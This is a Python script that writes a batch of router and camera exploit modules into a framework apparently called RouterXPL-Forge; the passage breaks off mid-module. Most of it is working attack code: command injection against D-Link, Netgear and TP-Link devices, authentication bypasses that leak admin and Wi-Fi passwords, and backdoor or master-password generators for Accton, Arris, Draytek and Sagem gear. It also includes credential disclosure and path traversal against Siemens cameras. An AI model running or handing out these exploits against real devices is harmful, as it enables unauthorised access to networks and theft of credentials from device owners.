#!/usr/bin/env python3
"""Batch import of third-party exploits into RouterXPL-Forge format.

Author: André Henrique (@mrhenrike) | União Geek
"""
import os
import textwrap

MODULES_BASE = os.path.join(
    os.path.dirname(os.path.dirname(os.path.abspath(__file__))),
    "routerxpl", "modules", "exploits", "routers",
)


def ensure_dir(path: str) -> None:
    os.makedirs(path, exist_ok=True)
    init = os.path.join(path, "__init__.py")
    if not os.path.exists(init):
        open(init, "w").close()


def write_module(vendor: str, filename: str, content: str) -> None:
    vendor_dir = os.path.join(MODULES_BASE, vendor)
    ensure_dir(vendor_dir)
    filepath = os.path.join(vendor_dir, filename)
    with open(filepath, "w", encoding="utf-8", newline="\n") as f:
        f.write(textwrap.dedent(content).lstrip("\n"))
    print(f"  [CREATED] {vendor}/{filename}")


MODULES = {}

# ---------- PHASE 1: REXT Exploit Modules ----------

MODULES[("dlink", "dir890l_soapaction_rce.py")] = '''\
import telnetlib
from routerxpl.core.exploit import *
from routerxpl.core.http.http_client import HTTPClient


class Exploit(HTTPClient):
    """D-Link SOAPAction header command execution."""

    __info__ = {
        "name": "D-Link SOAPAction Header Command Execution",
        "description": (
            "Exploits command execution via crafted SOAPAction header in multiple "
            "D-Link devices: DAP-1522 revB, DAP-1650 revB, DIR-880L, DIR-865L, "
            "DIR-860L revA/B, DIR-815 revB, DIR-300 revB, DIR-600 revB, DIR-645, "
            "TEW-751DR, TEW-733GR."
        ),
        "authors": (
            "Craig Heffner (devttys0)",
            "Jan Trencanski",
            "André Henrique (@mrhenrike)",
        ),
        "references": (
            "http://www.devttys0.com/2015/04/hacking-the-d-link-dir-890l/",
        ),
        "devices": (
            "D-Link DIR-890L", "D-Link DIR-880L", "D-Link DIR-865L",
            "D-Link DIR-860L revA/revB", "D-Link DIR-815 revB",
            "D-Link DIR-300 revB", "D-Link DIR-600 revB", "D-Link DIR-645",
            "D-Link DAP-1522 revB", "D-Link DAP-1650 revB",
            "TRENDnet TEW-751DR", "TRENDnet TEW-733GR",
        ),
    }

    target = OptIP("", "Target IPv4 or IPv6 address")
    port = OptPort(80, "Target HTTP port")

    def run(self):
        cmd = "killall httpd; killall hnap; telnetd -p 9999"
        headers = {
            "SOAPAction": '"http://purenetworks.com/HNAP1/GetDeviceSettings/`{}`"'.format(cmd)
        }

        response = self.http_request(method="POST", path="/HNAP1", headers=headers)

        if response is None:
            print_success("Exploit sent (httpd killed, telnetd should be on port 9999)")
            try:
                tn = telnetlib.Telnet(self.target, 9999, timeout=10)
                tn.read_until(b"#", timeout=5)
                tn.write(b"xmldbc -d /var/config.xml; cat /var/config.xml\\n")
                data = tn.read_until(b"#", timeout=15)
                tn.close()
                if data:
                    print_success("Configuration retrieved ({} bytes)".format(len(data)))
                    print_info(data.decode("ascii", errors="replace")[:2000])
            except Exception:
                print_status("Telnet failed; try manually: telnet {} 9999".format(self.target))
        else:
            print_error("HTTPd still responding; target may not be vulnerable")

    @mute
    def check(self):
        headers = {
            "SOAPAction": '"http://purenetworks.com/HNAP1/GetDeviceSettings/`echo 741852`"'
        }
        response = self.http_request(method="POST", path="/HNAP1", headers=headers)
        if response is not None and "741852" in response.text:
            return True
        return False
'''

MODULES[("linksys", "ea6100_auth_bypass.py")] = '''\
import re
from routerxpl.core.exploit import *
from routerxpl.core.http.http_client import HTTPClient


class Exploit(HTTPClient):
    """Linksys EA6100-EA6300 unauthenticated info disclosure."""

    __info__ = {
        "name": "Linksys EA6100/EA6300 Authentication Bypass",
        "description": (
            "Multiple CGI scripts in Linksys EA6100-EA6300 routers allow "
            "unauthenticated access to admin functions including credential "
            "and system information disclosure via sysinfo.cgi and getstinfo.cgi."
        ),
        "authors": (
            "KoreLogic",
            "Jan Trencanski",
            "André Henrique (@mrhenrike)",
        ),
        "references": (
            "https://www.korelogic.com/Resources/Advisories/KL-001-2015-006.txt",
        ),
        "devices": (
            "Linksys EA6100",
            "Linksys EA6200",
            "Linksys EA6300",
        ),
    }

    target = OptIP("", "Target IPv4 or IPv6 address")
    port = OptPort(80, "Target HTTP port")

    def run(self):
        response = self.http_request(method="GET", path="/sysinfo.cgi")
        if response is None:
            return
        if response.status_code != 200:
            print_error("Target returned status {}".format(response.status_code))
            return

        print_success("System info retrieved!")
        fields = {
            "default_passphrase": r"device::default_passphrase=(.*)",
            "MAC": r"device::mac_addr=(.*)",
            "Default SSID": r"device::default_ssid=(.*)",
            "WPS Pin": r"device::wps_pin=(.*)",
            "SSID (2.4G)": r"wl0_ssid=(.*)",
            "Passphrase (2.4G)": r"wl0_passphrase=(.*)",
            "SSID (5G)": r"wl1_ssid=(.*)",
            "Passphrase (5G)": r"wl1_passphrase=(.*)",
        }
        for label, pattern in fields.items():
            m = re.search(pattern, response.text)
            if m:
                print_success("{}: {}".format(label, m.group(1)))

        response2 = self.http_request(method="GET", path="/getstinfo.cgi")
        if response2 and response2.status_code == 200:
            print_success("Hash info (getstinfo.cgi):")
            print_info(response2.text[:500])

    @mute
    def check(self):
        response = self.http_request(method="GET", path="/sysinfo.cgi")
        if response and response.status_code == 200 and "device::" in response.text:
            return True
        return False
'''

MODULES[("netgear", "prosafe_rce.py")] = '''\
from routerxpl.core.exploit import *
from routerxpl.core.http.http_client import HTTPClient


class Exploit(HTTPClient):
    """Netgear ProSAFE pre-auth command execution."""

    __info__ = {
        "name": "Netgear ProSAFE Pre-Auth Remote Code Execution",
        "description": (
            "Pre-authentication command execution in the web interface of "
            "Netgear ProSAFE WC9500, WC7600, WC7520 wireless controllers."
        ),
        "authors": (
            "firmware.re",
            "Jan Trencanski",
            "André Henrique (@mrhenrike)",
        ),
        "references": (
            "http://firmware.re/vulns/acsa-2015-002.php",
        ),
        "devices": (
            "Netgear ProSAFE WC9500",
            "Netgear ProSAFE WC7600",
            "Netgear ProSAFE WC7520",
        ),
    }

    target = OptIP("", "Target IPv4 or IPv6 address")
    port = OptPort(80, "Target HTTP port")

    def run(self):
        check_payload = 'reqMethod=json_cli_reqMethod" "json_cli_jsonData"; echo "741852'
        response = self.http_request(method="POST", path="/login_handler.php", data=check_payload)
        if response is None:
            return
        if "741852" not in response.text:
            print_error("Target is not vulnerable (patched or different device)")
            return

        print_success("Target is vulnerable!")
        cmd_payload = 'reqMethod=json_cli_reqMethod" "json_cli_jsonData"; id; cat /etc/passwd'
        response = self.http_request(method="POST", path="/login_handler.php", data=cmd_payload)
        if response:
            print_success("Command output:")
            print_info(response.text[:2000])

    @mute
    def check(self):
        payload = 'reqMethod=json_cli_reqMethod" "json_cli_jsonData"; echo "741852'
        response = self.http_request(method="POST", path="/login_handler.php", data=payload)
        if response and "741852" in response.text:
            return True
        return False
'''

MODULES[("netgear", "rp614_auth_bypass.py")] = '''\
from routerxpl.core.exploit import *
from routerxpl.core.http.http_client import HTTPClient


class Exploit(HTTPClient):
    """Netgear RP614 authentication bypass via direct GET."""

    __info__ = {
        "name": "Netgear RP614 Authentication Bypass",
        "description": (
            "Bypasses authentication on Netgear RP614v2/v3 and devices using "
            "Embedded HTTPD v1.00 (1999 Delta Networks Inc.) by sending a "
            "direct GET request without prior HEAD negotiation."
        ),
        "authors": (
            "Todor Donev",
            "Jan Trencanski",
            "André Henrique (@mrhenrike)",
        ),
        "references": (
            "http://seclists.org/fulldisclosure/2016/Feb/35",
        ),
        "devices": (
            "Netgear RP614 v2",
            "Netgear RP614 v3",
        ),
    }

    target = OptIP("", "Target IPv4 or IPv6 address")
    port = OptPort(80, "Target HTTP port")

    def run(self):
        for page in ("rpSys.html", "lanform.html", "wanform.html", "statusform.html"):
            response = self.http_request(method="GET", path="/" + page)
            if response and response.status_code == 200 and len(response.text) > 100:
                print_success("Auth bypassed! Retrieved /{} ({} bytes)".format(page, len(response.text)))
                print_info(response.text[:1000])
                return
        print_error("Auth bypass failed on all known pages")

    @mute
    def check(self):
        response = self.http_request(method="GET", path="/rpSys.html")
        if response and response.status_code == 200 and len(response.text) > 100:
            return True
        return False
'''

MODULES[("netgear", "wg102_wn604_rce.py")] = '''\
import datetime
from routerxpl.core.exploit import *
from routerxpl.core.http.http_client import HTTPClient


class Exploit(HTTPClient):
    """Netgear WG102/WN604/WNAP RCE via boardData CGI."""

    __info__ = {
        "name": "Netgear WG102/WG103/WN604/WNAP Command Execution",
        "description": (
            "Pre-auth (WG102/WG103) or post-auth (WN604/WNDAP/WNAP) command "
            "execution via boardData CGI macAddress parameter injection in "
            "multiple Netgear enterprise access points."
        ),
        "authors": (
            "firmware.re",
            "Jan Trencanski",
            "André Henrique (@mrhenrike)",
        ),
        "references": (
            "http://firmware.re/vulns/acsa-2015-001.php",
        ),
        "devices": (
            "Netgear WG102", "Netgear WG103",
            "Netgear WN604", "Netgear WNDAP350", "Netgear WNDAP360",
            "Netgear WNAP320", "Netgear WNAP210",
            "Netgear WNDAP660", "Netgear WNDAP620",
        ),
    }

    target = OptIP("", "Target IPv4 or IPv6 address")
    port = OptPort(80, "Target HTTP port")

    _BOARD_FILES = (
        "boardDataWW.php", "boardDataNA.php", "boardDataJP",
        "boardData102.php", "boardData103.php",
    )

    def run(self):
        vuln_file = self._find_vuln_file()
        if not vuln_file:
            print_error("No vulnerable boardData endpoint found")
            return

        print_success("Vulnerable endpoint: /{}".format(vuln_file))
        cmd = "id; cat /etc/passwd"
        path = ("/{}?writeData=true&reginfo=0&macAddress= 001122334455"
                " -c 0 ;{};echo #").format(vuln_file, cmd)
        response = self.http_request(method="GET", path=path)
        if response and response.status_code == 200:
            print_success("Command output:")
            print_info(response.text[:2000])

    def _find_vuln_file(self):
        for bf in self._BOARD_FILES:
            cmd = "sleep 5"
            path = ("/{}?writeData=true&reginfo=0&macAddress= 001122334455"
                    " -c 0 ;{};echo #").format(bf, cmd)
            t0 = datetime.datetime.now()
            response = self.http_request(method="GET", path=path)
            elapsed = (datetime.datetime.now() - t0).seconds
            if response and response.status_code == 200 and "Update Success" in response.text:
                if 4 <= elapsed <= 10:
                    return bf
        return None

    @mute
    def check(self):
        return self._find_vuln_file() is not None
'''

MODULES[("netgear", "wndr_soap_auth_bypass.py")] = '''\
import re
from routerxpl.core.exploit import *
from routerxpl.core.http.http_client import HTTPClient


class Exploit(HTTPClient):
    """Netgear WNDR series SOAP auth bypass and info disclosure."""

    __info__ = {
        "name": "Netgear WNDR SOAP Authentication Bypass",
        "description": (
            "Exploits authentication bypass via empty SOAP body in Netgear "
            "WNDR3700v1-v4, WNDR3300, WNDR3800, WNDR4300, WNR1000v2, "
            "WNR2000v3, WNR2200, WNR2500, R6300v2, R7500. Leaks admin "
            "password, WLAN credentials, serial number, and attached devices."
        ),
        "authors": (
            "darkarnium",
            "Jan Trencanski",
            "André Henrique (@mrhenrike)",
        ),
        "references": (
            "https://github.com/darkarnium/secpub/tree/master/NetGear/SOAPWNDR",
        ),
        "devices": (
            "Netgear WNDR3700 v1/v2/v4", "Netgear WNDR3300",
            "Netgear WNDR3800", "Netgear WNDR4300",
            "Netgear WNR1000 v2", "Netgear WNR2000 v3",
            "Netgear WNR2200", "Netgear WNR2500",
            "Netgear R6300 v2", "Netgear R7500",
        ),
    }

    target = OptIP("", "Target IPv4 or IPv6 address")
    port = OptPort(80, "Target HTTP port")

    _STRIP = re.compile(r"<.*?>")

    def run(self):
        actions = {
            "DeviceInfo": "urn:NETGEAR-ROUTER:service:DeviceInfo:1#GetInfo",
            "AdminPassword": "urn:NETGEAR-ROUTER:service:LANConfigSecurity:1#GetInfo",
            "WLANConfig": "urn:NETGEAR-ROUTER:service:WLANConfiguration:1#GetInfo",
            "WPAKeys": "urn:NETGEAR-ROUTER:service:WLANConfiguration:1#GetWPASecurityKeys",
            "AttachedDevices": "urn:NETGEAR-ROUTER:service:DeviceInfo:1#GetAttachDevice",
        }
        for label, action in actions.items():
            response = self.http_request(
                method="POST", path="/", headers={"SOAPAction": action}, data="",
            )
            if response is None or response.status_code != 200:
                print_error("{}: request failed".format(label))
                continue
            print_success("{}:".format(label))
            self._parse(label, response.text)

    def _parse(self, label, text):
        patterns = {
            "DeviceInfo": [
                ("Device", r"<Description>(.*?)</Description>"),
                ("Serial", r"<SerialNumber>(.*?)</SerialNumber>"),
                ("Firmware", r"<Firmwareversion>(.*?)</Firmwareversion>"),
            ],
            "AdminPassword": [("Password", r"<NewPassword>(.*?)</NewPassword>")],
            "WLANConfig": [
                ("SSID", r"<NewSSID>(.*?)</NewSSID>"),
                ("Encryption", r"<NewBasicEncryptionModes>(.*?)</NewBasicEncryptionModes>"),
            ],
            "WPAKeys": [("WPA Passphrase", r"<NewWPAPassphrase>(.*?)</NewWPAPassphrase>")],
        }
        for field, pat in patterns.get(label, []):
            m = re.search(pat, text, re.DOTALL)
            if m:
                print_info("  {}: {}".format(field, self._STRIP.sub("", m.group(1)).strip()))

    @mute
    def check(self):
        response = self.http_request(
            method="POST", path="/",
            headers={"SOAPAction": "urn:NETGEAR-ROUTER:service:DeviceInfo:1#GetInfo"},
            data="",
        )
        if response and response.status_code == 200 and "<SerialNumber>" in response.text:
            return True
        return False
'''

# ---------- PHASE 2: REXT Misc ----------

MODULES[("multi", "accton_switch_backdoor_password.py")] = '''\
from routerxpl.core.exploit import *
from routerxpl.core.exploit.exploit import Exploit as BaseExploit


class Exploit(BaseExploit):
    """Accton-based switch backdoor password generator."""

    __info__ = {
        "name": "Accton Switch Backdoor Password Generator",
        "description": (
            "Generates the __super backdoor password for Accton-based switches "
            "rebranded by 3Com, Dell, SMC, Foundry, and EdgeCore from MAC address."
        ),
        "authors": (
            "Jan Trencanski",
            "André Henrique (@mrhenrike)",
        ),
        "references": (
            "https://www.exploit-db.com/exploits/14875",
        ),
        "devices": (
            "Accton-based switches (3Com, Dell, SMC, Foundry, EdgeCore)",
        ),
    }

    target = OptIP("", "Target switch IP")
    port = OptPort(23, "Telnet port")

    def run(self):
        mac = getattr(self, "_mac", "00:00:00:00:00:00")
        octets = [int(mac.replace(":", "").replace("-", "")[i:i+2], 16) for i in range(0, 12, 2)]
        password = ""
        for i in range(5):
            password += self._enc(octets[i] + octets[i + 1])
        for i in range(3):
            password += self._enc(octets[i] + octets[i + 1] + 0xF)
        print_success("Backdoor credentials:")
        print_table(("Field", "Value"), ("Username", "__super"), ("Password", password))

    @staticmethod
    def _enc(c):
        c %= 0x4B
        if c <= 9 or (0x10 < c < 0x2A) or c > 0x30:
            return chr(c + 0x30)
        return "!"

    @mute
    def check(self):
        return False
'''

MODULES[("arris", "tm602a_password_of_the_day.py")] = '''\
import datetime
import math
from routerxpl.core.exploit import *
from routerxpl.core.exploit.exploit import Exploit as BaseExploit


class Exploit(BaseExploit):
    """Arris modem password-of-the-day generator."""

    __info__ = {
        "name": "Arris TM602A Password of the Day Generator",
        "description": (
            "Generates the daily technician password for Arris cable modems "
            "(TM602A, TM602G, TM502G, TG862, SB6141, SBG6580) "
            "using the MPSJKMDHAI seed algorithm."
        ),
        "authors": (
            "Raul Pedro Fernandes Santos (borfast)",
            "Jan Trencanski",
            "André Henrique (@mrhenrike)",
        ),
        "references": (
            "http://www.borfast.com/projects/arrispwgen",
        ),
        "devices": (
            "Arris TM602A", "Arris TM602G", "Arris TM502G",
            "Arris TG862", "Arris SB6141", "Arris SBG6580",
        ),
    }

    target = OptIP("", "Target modem IP")
    port = OptPort(80, "HTTP port")

    def run(self):
        today = datetime.date.today()
        password = self._generate(today)
        print_success("Arris password of the day:")
        print_table(("Date", "Password"), (today.isoformat(), password))

    @staticmethod
    def _generate(d):
        seed = "MPSJKMDHAI"
        t1 = [[15,15,24,20,24],[13,14,27,32,10],[29,14,32,29,24],
              [23,32,24,29,29],[14,29,10,21,29],[34,27,16,23,30],[14,22,24,17,13]]
        t2 = [[0,1,2,9,3,4,5,6,7,8],[1,4,3,9,0,7,8,2,5,6],[7,2,8,9,4,1,6,0,3,5],
              [6,3,5,9,1,8,2,7,4,0],[4,7,0,9,5,2,3,1,8,6],[5,6,1,9,8,0,4,3,2,7]]
        an = list("0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ")
        y, m, dm = d.year % 100, d.month, d.day
        dow = (d.weekday() + 1) % 7
        dow = 6 if dow == 0 else dow - 1
        l1 = list(t1[dow]) + [0, 0, 0]
        l1[5] = dm
        diff = (y + m) - dm
        l1[6] = (diff + 36) % 36 if diff < 0 else diff % 36
        l1[7] = (((3 + ((y + m) % 12)) * dm) % 37) % 36
        l2 = [ord(c) % 36 for c in seed[:8]]
        l3 = [(l1[i] + l2[i]) % 36 for i in range(8)]
        l3.append(sum(l3) % 36)
        n8 = l3[8] % 6
        l3.append(int(math.pow(n8, 2) + 0.5))
        l4 = [l3[t2[n8][i]] for i in range(10)]
        l5 = [int((ord(seed[i]) + l4[i]) % 36) for i in range(10)]
        return "".join(an[v] for v in l5)

    @mute
    def check(self):
        return False
'''

MODULES[("draytek", "vigor_master_key.py")] = '''\
import re
from binascii import unhexlify
from routerxpl.core.exploit import *
from routerxpl.core.exploit.exploit import Exploit as BaseExploit


class Exploit(BaseExploit):
    """Draytek Vigor master key generator from MAC address."""

    __info__ = {
        "name": "Draytek Vigor V2XXX/V3XXX Master Key Generator",
        "description": (
            "Generates the master admin password for older firmware versions "
            "of Draytek Vigor V2XXX and V3XXX routers from the device MAC address."
        ),
        "authors": (
            "Nikita Abdullin (AMMOnium)",
            "Jan Trencanski",
            "André Henrique (@mrhenrike)",
        ),
        "references": (
            "https://github.com/ammonium/draytools",
        ),
        "devices": (
            "Draytek Vigor V2XXX series",
            "Draytek Vigor V3XXX series",
        ),
    }

    target = OptIP("", "Target router IP")
    port = OptPort(80, "HTTP port")

    def run(self):
        mac = getattr(self, "_mac", "00:00:00:00:00:00")
        mac_clean = re.sub(r"[:\\-]", "", mac)
        if len(mac_clean) != 12:
            print_error("Invalid MAC format")
            return
        xmac = unhexlify(mac_clean.encode())
        password = self._keygen(xmac)
        print_success("Master credentials:")
        print_table(("Field", "Value"), ("Username", "Admin"), ("Password", password))

    @staticmethod
    def _keygen(mac):
        atu = "WAHOBXEZCLPDYTFQMJRVINSUGK"
        atl = "kgusnivrjmqftydplczexbohaw"
        res = ["\\x00"] * 8
        st = [0] * 8
        a3 = 0
        for b in mac:
            a3 = ((a3 << 5) & 0xFFFFFFFF - a3 + (b if b < 0x80 else b | 0xFFFFFF00)) & 0xFFFFFFFF
        v1 = ((0x4EC4EC4F * a3 & 0xFFFFFFFF00000000) >> 32) >> 3
        v0 = ((((v1 << 1) + v1) << 2) + v1) << 1
        st[0] = a3
        idx0 = abs(a3 - v0)
        res[0] = atu[idx0 % 26]
        for i in range(1, 8):
            v0 = ((st[i-1] << 5) & 0xFFFFFFFF) - st[i-1]
            for j in range(8):
                v0 = (v0 + ord(res[j])) & 0xFFFFFFFF
            st[i] = v0
            v1i = ((0x4EC4EC4F * v0 & 0xFFFFFFFF00000000) >> 32) >> 3
            v0i = ((((v1i << 1) + v1i) << 2) + v1i) << 1
            idx = abs(v0 - v0i) % 26
            res[i] = atu[idx] if (i & 1) == 0 else atl[idx]
        return "".join(res)

    @mute
    def check(self):
        return False
'''

MODULES[("multi", "sagem_fast_telnet_password.py")] = '''\
from routerxpl.core.exploit import *
from routerxpl.core.exploit.exploit import Exploit as BaseExploit


class Exploit(BaseExploit):
    """Sagem FAST root telnet password generator from MAC."""

    __info__ = {
        "name": "Sagem FAST Telnet Password Generator",
        "description": (
            "Generates the root telnet password for Sagem FAST 3304-V1/V2, "
            "3464, 3504 routers from the device MAC address."
        ),
        "authors": (
            "Elouafiq Ali",
            "Jan Trencanski",
            "André Henrique (@mrhenrike)",
        ),
        "references": (
            "https://www.exploit-db.com/exploits/17670",
        ),
        "devices": (
            "Sagem FAST 3304-V1", "Sagem FAST 3304-V2",
            "Sagem FAST 3464", "Sagem FAST 3504",
        ),
    }

    target = OptIP("", "Target router IP")
    port = OptPort(23, "Telnet port")

    def run(self):
        mac = getattr(self, "_mac", "00:00:00:00:00:00")
        c = list(mac.upper().replace("-", "").replace(":", "").lower())
        if len(c) != 12:
            print_error("Invalid MAC format")
            return
        pwd = [
            self._m(c[5],c[11]), self._m(c[0],c[2]), self._m(c[10],c[11]),
            self._m(c[0],c[9]), self._m(c[10],c[6]), self._m(c[3],c[9]),
            self._m(c[1],c[6]), self._m(c[3],c[4]),
        ]
        print_success("Telnet credentials:")
        print_table(("Field", "Value"), ("Username", "root"), ("Password", "".join(pwd)))

    @staticmethod
    def _m(a, b):
        first, second = (a, b) if a <= b else (b, a)
        si, fi = int(second, 16), int(first, 16)
        if si < 10:
            t = ord(first) + si
            return chr(t) if fi + si <= 9 else hex(t)
        return chr(ord(second) + fi)

    @mute
    def check(self):
        return False
'''

MODULES[("multi", "airlive_wt2000arm_info_disclosure.py")] = '''\
import re
from routerxpl.core.exploit import *
from routerxpl.core.http.http_client import HTTPClient


class Exploit(HTTPClient):
    """AirLive WT-2000ARM PPPoE and WLAN credential harvester."""

    __info__ = {
        "name": "AirLive WT-2000ARM Credential Disclosure",
        "description": (
            "Fetches PPPoE/PPPoA and WLAN credentials from AirLive WT-2000ARM "
            "routers using default credentials (admin/airlive)."
        ),
        "authors": (
            "Jan Trencanski",
            "André Henrique (@mrhenrike)",
        ),
        "references": (),
        "devices": ("AirLive WT-2000ARM",),
    }

    target = OptIP("", "Target IPv4 or IPv6 address")
    port = OptPort(80, "Target HTTP port")

    def run(self):
        response = self.http_request(
            method="GET", path="/basic/home_wan.htm", auth=("admin", "airlive"),
        )
        if response is None or response.status_code == 401:
            print_error("Authentication failed")
            return
        if response.status_code != 200:
            print_error("Unexpected status: {}".format(response.status_code))
            return
        print_success("Authenticated! Extracting credentials...")
        for label, pat in [
            ("PPPoE User", r'name="wan_PPPUsername".*?value="(.*?)"'),
            ("PPPoE Pass", r'name="wan_PPPPassword".*?value="(.*?)"'),
        ]:
            m = re.search(pat, response.text, re.DOTALL)
            if m:
                print_success("{}: {}".format(label, m.group(1)))

    @mute
    def check(self):
        r = self.http_request(method="GET", path="/basic/home_wan.htm", auth=("admin", "airlive"))
        return r is not None and r.status_code == 200
'''

# ---------- PHASE 3: HatSploit ----------

MODULES[("multi", "3com_ap8670_cred_disclosure.py")] = '''\
import re
from routerxpl.core.exploit import *
from routerxpl.core.http.http_client import HTTPClient


class Exploit(HTTPClient):
    """3Com AP8670 unauthenticated credentials disclosure."""

    __info__ = {
        "name": "3Com AP8670 Credentials Disclosure",
        "description": (
            "Exploits a vulnerability in 3Com AP8670 access point that allows "
            "unauthenticated retrieval of admin credentials from /s_brief.htm."
        ),
        "authors": (
            "Richard Brain",
            "Ivan Nikolskiy (enty8080)",
            "André Henrique (@mrhenrike)",
        ),
        "references": (),
        "devices": ("3Com AP8670",),
    }

    target = OptIP("", "Target IPv4 or IPv6 address")
    port = OptPort(80, "Target HTTP port")

    def run(self):
        response = self.http_request(method="GET", path="/s_brief.htm")
        if response is None:
            return
        u = re.findall(r'name="szUsername".*?value="(.+?)"', response.text)
        p = re.findall(r'name="szPassword".*?value="(.+?)"', response.text)
        if u and p:
            print_success("Credentials found!")
            print_table(("Username", "Password"), (u[0], p[0]))
        else:
            print_error("No credentials found")

    @mute
    def check(self):
        r = self.http_request(method="GET", path="/s_brief.htm")
        return r is not None and r.status_code == 200
'''

MODULES[("dlink", "dcs_cred_disclosure_cve_2020_25078.py")] = '''\
from routerxpl.core.exploit import *
from routerxpl.core.http.http_client import HTTPClient


class Exploit(HTTPClient):
    """D-Link DCS camera credentials disclosure (CVE-2020-25078)."""

    __info__ = {
        "name": "D-Link DCS Credentials Disclosure",
        "description": (
            "D-Link DCS-2530L (< 1.06.01) and DCS-2670L (<= 2.02) allow "
            "unauthenticated credential retrieval via /config/getuser?index=0."
        ),
        "authors": (
            "Ivan Nikolskiy (enty8080)",
            "André Henrique (@mrhenrike)",
        ),
        "references": (
            "https://nvd.nist.gov/vuln/detail/CVE-2020-25078",
        ),
        "devices": (
            "D-Link DCS-2530L (< 1.06.01)",
            "D-Link DCS-2670L (<= 2.02)",
        ),
    }

    target = OptIP("", "Target IPv4 or IPv6 address")
    port = OptPort(80, "Target HTTP port")

    def run(self):
        response = self.http_request(method="GET", path="/config/getuser?index=0")
        if response is None:
            return
        if "name" in response.text and "pass" in response.text:
            creds = {}
            for line in response.text.strip().split("\\n"):
                if "=" in line:
                    k, v = line.split("=", 1)
                    creds[k.strip()] = v.strip()
            print_success("Credentials found!")
            print_table(("Username", "Password"), (creds.get("name", "?"), creds.get("pass", "?")))
        else:
            print_error("Unexpected response format")

    @mute
    def check(self):
        r = self.http_request(method="GET", path="/config/getuser?index=0")
        return r is not None and r.status_code == 200 and "name" in r.text and "pass" in r.text
'''

MODULES[("siemens", "ccms2025_cred_disclosure.py")] = '''\
from routerxpl.core.exploit import *
from routerxpl.core.http.http_client import HTTPClient


class Exploit(HTTPClient):
    """Siemens CCMS2025 IP-Camera credentials disclosure."""

    __info__ = {
        "name": "Siemens CCMS2025 Credentials Disclosure",
        "description": (
            "Siemens IP-Camera CCMS2025(-IR) allows unauthenticated retrieval "
            "of admin credentials via /cgi-bin/readfile.cgi?query=ADMINID."
        ),
        "authors": (
            "Yakir Wizman",
            "Ivan Nikolskiy (enty8080)",
            "André Henrique (@mrhenrike)",
        ),
        "references": ("https://www.exploit-db.com/exploits/40254",),
        "devices": ("Siemens IP-Camera CCMS2025", "Siemens IP-Camera CVMS2025-IR"),
    }

    target = OptIP("", "Target IPv4 or IPv6 address")
    port = OptPort(80, "Target HTTP port")

    def run(self):
        r = self.http_request(method="GET", path="/cgi-bin/readfile.cgi?query=ADMINID")
        if r is None:
            return
        try:
            parts = r.text.split(";")
            user = parts[0].replace('var Adm_ID="', "").strip(' "')
            pwd = parts[1].replace('var Adm_Pass1="', "").strip(' "')
            print_success("Credentials found!")
            print_table(("Username", "Password"), (user, pwd))
        except (IndexError, ValueError):
            print_error("Could not parse credentials")

    @mute
    def check(self):
        r = self.http_request(method="GET", path="/cgi-bin/readfile.cgi?query=ADMINID")
        return r is not None and r.status_code == 200
'''

MODULES[("siemens", "ccms2025_path_traversal.py")] = '''\
from routerxpl.core.exploit import *
from routerxpl.core.http.http_client import HTTPClient


class Exploit(HTTPClient):
    """Siemens CCMS2025 IP-Camera path traversal."""

    __info__ = {
        "name": "Siemens CCMS2025 Path Traversal",
        "description": (
            "Siemens IP-Camera CCMS2025(-IR) allows unauthenticated file read "
            "via /cgi-bin/check.cgi?file= path traversal."
        ),
        "authors": (
            "Yakir Wizman",
            "Ivan Nikolskiy (enty8080)",
            "André Henrique (@mrhenrike)",
        ),
        "references": ("https://www.exploit-db.com/exploits/40254",),
        "devices": ("Siemens IP-Camera CCMS2025", "Siemens IP-Camera CVMS2025-IR"),
    }

    target = OptIP("", "Target IPv4 or IPv6 address")
    port = OptPort(80, "Target HTTP port")

    def run(self):
        r = self.http_request(method="GET", path="/cgi-bin/check.cgi?file=../../../etc/passwd")
        if r is None:
            return
        if r.text.strip():
            print_success("File contents:")
            print_info(r.text[:3000])
        else:
            print_error("Empty response")

    @mute
    def check(self):
        r = self.http_request(method="GET", path="/cgi-bin/check.cgi?file=../../../etc/passwd")
        return r is not None and r.status_code == 200 and "root:" in r.text
'''

# ---------- PHASE 4: Standalone PoCs ----------

MODULES[("tplink", "wdr5620_cmd_injection.py")] = '''\
from routerxpl.core.exploit import *
from routerxpl.core.http.http_client import HTTPClient


class Exploit(HTTPClient):
    """TP-Link WDR5620 V3 command injection via weather API."""

    __info__ = {
        "name": "TP-Link WDR5620 V3 Command Injection",
        "description": (
            "TP-Link WDR5620 V3.0 is vulnerable to authenticated command "
            "injection via the weather citycode parameter in the /ds endpoint."
        ),
        "authors": (
            "Zhiniang Peng (Qihoo 360)",
            "Fangming Gu",
            "André Henrique (@mrhenrike)",
        ),
        "references": (
            "https://github.com/afang5472/TP-Link-WDR-Router-Command-injection_POC",
        ),
        "devices": ("TP-Link WDR5620 V3.0",),
    }

    target = OptIP("", "Target IPv4 or IPv6 address")
    port = OptPort(80, "Target HTTP port")

    def run(self):
        cmd = "id"
        payload = (
            '{"weather":{"get_weather_observe":'
            '{"citycode":"1;' + cmd + ' > /www/web-static/_rxf_out;",'
            '"new_pwd":"a"}},"method":"do"}'
        )
        self.http_request(
            method="POST", path="/stok=AAAA/ds", data=payload,
            headers={"Content-Type": "application/json; charset=UTF-8"},
        )
        r = self.http_request(method="GET", path="/web-static/_rxf_out")
        if r and r.text.strip():
            print_success("Command output:")
            print_info(r.text.strip())
        else:
            print_error("No output; stok token may need to be set after authentication")

    @mute
    def check(self):
        return False
'''

MODULES[("tplink", "wr849n_traceroute_rce.py")] = '''\
from routerxpl.core.exploit import *
from routerxpl.core.http.http_client import HTTPClient


class Exploit(HTTPClient):
    """TP-Link TL-WR849N RCE via traceroute command injection."""

    __info__ = {
        "name": "TP-Link TL-WR849N Traceroute Command Injection",
        "description": (
            "TP-Link TL-WR849N is vulnerable to authenticated command injection "
            "via the traceroute host parameter in /cgi?2 endpoint."
        ),
        "authors": (
            "Elber Tavares",
            "André Henrique (@mrhenrike)",
        ),
        "references": ("https://github.com/ElberTavares/routers-exploit",),
        "devices": ("TP-Link TL-WR849N",),
    }

    target = OptIP("", "Target IPv4 or IPv6 address")
    port = OptPort(80, "Target HTTP port")

    def run(self):
        cmd = "id"
        inject = (
            "[TRACEROUTE_DIAG#0,0,0,0,0,0#0,0,0,0,0,0]0,8\\r\\n"
            "maxHopCount=20\\r\\ntimeout=5\\r\\nnumberOfTries=1\\r\\n"
            'host="$(' + cmd + ')"\\r\\ndataBlockSize=64\\r\\n'
            "X_TP_ConnName=ewan_pppoe\\r\\ndiagnosticsState=Requested\\r\\n"
            "X_TP_HopSeq=0\\r\\n"
        )
        self.http_request(
            method="POST", path="/cgi?2", data=inject,
